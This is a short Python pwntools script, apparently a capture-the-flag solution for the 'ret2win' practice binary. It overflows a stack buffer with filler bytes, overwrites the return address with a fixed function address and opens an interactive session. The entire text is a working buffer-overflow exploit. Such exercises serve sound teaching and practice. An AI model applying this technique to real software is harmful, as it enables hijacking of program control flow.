from pwn import * 
 
p = process('./ret2win') 
sys_addr = 0x0000000000400756 
payload = 'A'*0x20 + 'A'*0x08 + p64(sys_addr) 
p.sendlineafter('> ',payload) 
p.interactive()
